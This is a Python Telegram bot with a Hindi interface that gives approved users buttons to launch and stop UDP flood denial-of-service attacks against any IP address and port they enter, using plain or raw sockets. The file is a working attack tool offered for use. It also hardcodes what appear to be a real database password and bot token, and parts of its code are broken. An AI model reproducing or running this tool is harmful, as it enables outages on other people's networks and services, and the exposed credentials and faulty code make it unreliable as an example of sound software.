
import asyncio
import logging
import pymongo
from telebot import TeleBot, types
import os
import socket

# --- Database Setup ---
MONGO_URI = os.environ.get("mongodb+srv://VIKASH:BadnamBadshah@cluster0.jv9he.mongodb.net/?retryWrites=true&w=majority&appName=Cluster0&tlsAllowInvalidCertificates=true", "")
#MONGO_DB_NAME = "botdb"

client = pymongo.MongoClient(MONGO_URI)
db = client["VIKASH"]
users_collection = db["users"]
admins_collection = db["admins"]


# --- Bot Setup ---
BOT_TOKEN = os.environ.get("7947138730:AAGyjFxdtIxhupkdH2LiSNPc5CmX6wB-TMs", "")
bot = TeleBot(BOT_TOKEN)


# --- Attack Tracking ---
user_attacks = {}  # user_id: ([tasks], stop_flag)
attack_in_progress = {}

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s - %(levelname)s - %(message)s",
    datefmt="%Y-%m-%d %H:%M:%S",
)


# --- Database Functions ---
def get_user(user_id):
    return users_collection.find_one({"user_id": user_id})


def create_user(user_id):
    if get_user(user_id):
        return
    users_collection.insert_one({"user_id": user_id, "approved": False})


def is_user_approved(user_id):
    user = get_user(user_id)
    return user and user.get("approved", False)

def set_user_approval(user_id, approved):
    users_collection.update_one({"user_id": user_id}, {"$set": {"approved": approved}})

def is_admin(user_id):
    return admins_collection.find_one({"user_id": user_id}) is not None

def create_admin(user_id):
    if is_admin(user_id):
        return
    admins_collection.insert_one({"user_id": user_id})


def log_command(user_id, command):
    logging.info(f"User ID {user_id} executed command: {command}")

async def send_udp_packet(target_ip, target_port, stop_flag, use_raw_socket=False):
    try:
        if use_raw_socket:
            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_UDP)
            s.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            
            # Construct an IP packet (minimal, adjust as needed)
            ip_header = b'\x45\x00\x00\x1c\x00\x00\x40\x00\x40\x11\x00\x00' # Minimal IP header
            ip_header += socket.inet_aton('0.0.0.0')  # Source IP is filled by OS 
            ip_header += socket.inet_aton(target_ip)
            udp_header = b'\x00\x00' + target_port.to_bytes(2, 'big') + b'\x00\x08\x00\x00'
            packet = ip_header + udp_header + b'A' * 8 # minimal data
            while not stop_flag.is_set():
                s.sendto(packet, (target_ip, 0))
        else:
            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            while not stop_flag.is_set():
                s.sendto(b'A'* 1024, (target_ip, target_port))
    except Exception as e:
        logging.error(f"Error in sending UDP packet: {e}")
    finally:
        if 's' in locals():
            s.close()

async def start_udp_flood(user_id, target_ip, target_port, use_raw_socket=False):
    if user_id in user_attacks:
        bot.send_message(user_id, "अटैक पहले से चालू है 😼")
        return

    stop_flag = asyncio.Event()
    tasks = []
    for _ in range(5):
         task = asyncio.create_task(send_udp_packet(target_ip, target_port, stop_flag, use_raw_socket))
         tasks.append(task)
    user_attacks[user_id] = (tasks, stop_flag)
    attack_in_progress[user_id] = True
    bot.send_message(user_id, f"अटैक {target_ip}:{target_port} पर चालू कर दिया गया है 😼")

async def stop_attack(user_id):
    if user_id in user_attacks:
        tasks, stop_flag = user_attacks[user_id]
        stop_flag.set()
        for task in tasks:
            await task  # Wait for all tasks to finish
        del user_attacks[user_id]
        del attack_in_progress[user_id]
        bot.send_message(user_id, "रोक दिया बे 😼")
    else:
        bot.send_message(user_id, "कोई अटैक नहीं मिला 😼")

# --- Command Handlers ---
@bot.message_handler(commands=["start"])
def start_command_handler(message):
    user_id = message.from_user.id
    create_user(user_id)  # Create user if they don't exist
    if is_admin(user_id):
       bot.send_message(user_id, "नमस्कार, स्वामी! आप क्या चाहते हैं?", reply_markup=admin_main_menu())
    else:
       bot.send_message(user_id, "नमस्ते! कृपया अनुमोदन के लिए प्रतीक्षा करें।")


def create_inline_keyboard(options):
    markup = types.InlineKeyboardMarkup(row_width=2)
    buttons = [types.InlineKeyboardButton(text=text, callback_data=data)
               for text, data in options.items()]
    markup.add(*buttons)
    return markup

def admin_main_menu():
    options = {
       "अनुमोदित करें / अस्वीकृत करें": "manage_users",
       "अधिक विकल्प": "more_options"
    }
    return create_inline_keyboard(options)

def main_menu():
    options = {
       "अटैक": "attack",
       "रोक": "stop",
       "अधिक विकल्प": "more_options"
    }
    return create_inline_keyboard(options)

def more_options_menu():
    options = {
        "बैक": "back_to_main"
    }
    return create_inline_keyboard(options)
    

def attack_menu():
     options = {
         "नियमित सॉकेट": "attack_regular",
         "कच्चा सॉकेट": "attack_raw",
         "बैक": "back_to_main"
     }
     return create_inline_keyboard(options)

def stop_attack_menu():
    options = {
        "रोक": "stop",
        "बैक": "back_to_main"
    }
    return create_inline_keyboard(options)

def manage_user_menu():
      unapproved_users = list(users_collection.find({"approved": False}))
      options = {}
      for user in unapproved_users:
            options[f"User ID: {user['user_id']}"] = f"user_{user['user_id']}"
      options["बैक"] = "back_to_admin"
      return create_inline_keyboard(options)

def approval_menu(user_id):
    options = {
        "स्वीकृत करें": f"approve_{user_id}",
        "अस्वीकृत करें": f"disapprove_{user_id}",
        "बैक": "back_to_manage_users"
    }
    return create_inline_keyboard(options)
    
@bot.callback_query_handler(func=lambda call: True)
def callback_query(call):
    user_id = call.from_user.id
    data = call.data
    if is_admin(user_id):
        if data == "manage_users":
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="उपयोगकर्ताओं का प्रबंधन करें:", reply_markup=manage_user_menu())
        elif data == "more_options":
             bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="अधिक विकल्प:", reply_markup=more_options_menu())
        elif data == "back_to_admin":
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="नमस्कार, स्वामी! आप क्या चाहते हैं?", reply_markup=admin_main_menu())
        elif data == "back_to_manage_users":
             bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="उपयोगकर्ताओं का प्रबंधन करें:", reply_markup=manage_user_menu())
        elif data.startswith("user_"):
            target_user_id = int(data.split("_")[1])
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"उपयोगकर्ता आईडी: {target_user_id} को प्रबंधित करें", reply_markup=approval_menu(target_user_id))
        elif data.startswith("approve_"):
            target_user_id = int(data.split("_")[1])
            set_user_approval(target_user_id, True)
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"उपयोगकर्ता {target_user_id} को अनुमोदित किया गया।", reply_markup=manage_user_menu())
        elif data.startswith("disapprove_"):
            target_user_id = int(data.split("_")[1])
            set_user_approval(target_user_id, False)
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text=f"उपयोगकर्ता {target_user_id} को अस्वीकृत किया गया।", reply_markup=manage_user_menu())
    else:
       if not is_user_approved(user_id):
           bot.answer_callback_query(call.id, "अनुमोदन के लिए कृपया प्रतीक्षा करें।")
           return
       
       if data == "attack":
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="अटैक विकल्प चुनें:", reply_markup=attack_menu())
       elif data == "stop":
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="अटैक विकल्प चुनें:", reply_markup=stop_attack_menu())
       elif data == "more_options":
             bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="अधिक विकल्प:", reply_markup=more_options_menu())
       elif data == "back_to_main":
            bot.edit_message_text(chat_id=call.message.chat.id, message_id=call.message.message_id, text="आप क्या चाहते हैं?", reply_markup=main_menu())
       elif data == "attack_regular":
            bot.send_message(user_id, "लक्ष्य IP और पोर्ट दर्ज करें (जैसे: 192.168.1.100 8080)")
            bot.register_next_step_handler(call.message, process_attack_command, use_raw_socket=False)
       elif data == "attack_raw":
           bot.send_message(user_id, "लक्ष्य IP और पोर्ट दर्ज करें (जैसे: 192.168.1.100 8080)")
           bot.register_next_step_handler(call.message, process_attack_command, use_raw_socket=True)
       elif data == "stop":
          asyncio.run(stop_attack(user_id))
          bot.send_message(user_id, "आप क्या चाहते हैं?", reply_markup=main_menu())


def process_attack_command(message, use_raw_socket):
    try:
        user_id = message.from_user.id
        text = message.text.split()
        if len(text) != 2:
            bot.send_message(user_id, "गलत प्रारूप। IP और पोर्ट प्रदान करें।")
            return
        
        target_ip, target_port = text
        target_port = int(target_port)
        
        asyncio.run(start_udp_flood(user_id, target_ip, target_port, use_raw_socket))
        bot.send_message(user_id, "आप क्या चाहते हैं?", reply_markup=main_menu())
    except Exception as e:
        logging.error(f"Error in processing command: {e}")
        bot.send_message(message.chat.id, "एक त्रुटि हुई। कृपया पुनः प्रयास करें।")

# --- Main ---
async def main():
    bot.infinity_polling()


if __name__ == "__main__":
    asyncio.run(main())
